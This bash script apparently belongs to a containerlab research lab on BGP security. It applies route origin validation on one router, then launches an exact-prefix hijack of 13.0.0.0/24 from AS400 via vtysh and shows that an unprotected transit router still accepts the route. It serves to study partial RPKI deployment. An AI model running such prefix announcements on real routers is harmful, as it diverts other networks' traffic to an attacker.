#!/bin/bash
# =============================================================
# partial_deployment_demo.sh — NOVELTY DEMO
#
# Shows that when ONLY R1 has ROV mitigation but R2 does not,
# the hijack still succeeds via R2's unprotected path.
# This mirrors the real-world partial RPKI deployment problem.
# =============================================================
LAB="bgp-hijack"
R1="clab-${LAB}-r1"; R2="clab-${LAB}-r2"; R4="clab-${LAB}-r4"
BOLD="\033[1m"; RED="\033[31m"; GREEN="\033[32m"
YELLOW="\033[33m"; CYAN="\033[36m"; RESET="\033[0m"

echo -e "${BOLD}================================================${RESET}"
echo -e "${BOLD}  NOVELTY DEMO: Partial Deployment Failure${RESET}"
echo -e "${BOLD}================================================${RESET}"
echo ""
echo -e "Scenario: Only R1 (AS100) deploys ROV mitigation."
echo -e "R2 (AS200, transit) has NO mitigation."
echo -e "Question: Does the hijack still succeed?"
echo ""

echo -e "${CYAN}Phase 1 — Applying mitigation on R1 only${RESET}"
bash "$(dirname "$0")/apply_mitigation.sh"

echo ""
echo -e "${CYAN}Phase 2 — Launching exact prefix hijack from AS400${RESET}"
docker exec "$R4" vtysh \
  -c "configure terminal" \
  -c "router bgp 400" \
  -c "network 13.0.0.0/24" \
  -c "end" \
  -c "write memory"
docker exec "$R4" ip route add 13.0.0.0/24 via 127.0.0.1 dev lo 2>/dev/null || true

echo "Waiting 15s for BGP convergence..."
sleep 15

echo ""
echo -e "${YELLOW}--- R1 BGP table for 13.0.0.0/24 (R1 IS protected) ---${RESET}"
docker exec "$R1" vtysh -c "show bgp ipv4 unicast 13.0.0.0/24"

echo ""
echo -e "${YELLOW}--- R2 BGP table for 13.0.0.0/24 (R2 is NOT protected) ---${RESET}"
docker exec "$R2" vtysh -c "show bgp ipv4 unicast 13.0.0.0/24"

echo ""
echo -e "${BOLD}================================================${RESET}"
echo -e "${GREEN}R1 (protected):  Rejects AS400 hijack ✓${RESET}"
echo -e "${RED}R2 (unprotected): Still accepts AS400 hijack ✗${RESET}"
echo -e "${RED}Any traffic routed via R2 still reaches the attacker${RESET}"
echo ""
echo -e "${BOLD}Finding for report:${RESET}"
echo -e "  Partial ROV deployment protects individual ASes"
echo -e "  but does NOT protect the global routing system."
echo -e "  Universal adoption is required for full effectiveness."
echo -e "  This aligns with ROV++ findings on partial deployment."
echo -e "${BOLD}================================================${RESET}"

echo ""
echo -e "${CYAN}Cleaning up...${RESET}"
bash "$(dirname "$0")/stop_attack.sh"
bash "$(dirname "$0")/remove_mitigation.sh"
echo -e "${GREEN}Done. Lab restored to clean state.${RESET}"
